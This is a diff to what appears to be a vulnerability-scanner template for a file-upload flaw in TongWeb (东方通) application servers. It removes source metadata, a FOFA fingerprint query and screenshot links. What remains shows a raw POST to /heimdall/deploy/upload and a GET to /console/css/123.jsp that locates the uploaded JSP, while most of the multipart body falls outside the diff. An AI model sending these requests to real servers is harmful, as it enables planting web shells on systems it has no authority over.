@@ -3,12 +3,8 @@ info:
   name: 东方通 upload存在文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vbv5m0s1mm120w1f'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vbv5m0s1mm120w1f
-    fofa: 'banner="Server: TongWeb Server" || header="Server: TongWeb Server"'
 http:
 - raw:
   - 'POST /heimdall/deploy/upload?method=upload HTTP/1.1
@@ -39,11 +35,8 @@ http:
 
     ------WebKitFormBoundary8UaANmWAgM4BqBSs--
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1727413386991-761da63f-63e5-4d3c-87dd-d7c466d623f3.png)
 
-    上传定位：GET /console/css/123.jsp HTTP/1.1
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1727413387200-79ba5e2a-e62b-405b-8ae4-972df94ab586.png)'
+    上传定位：GET /console/css/123.jsp HTTP/1.1'
   redirects: false
   matchers:
   - status:
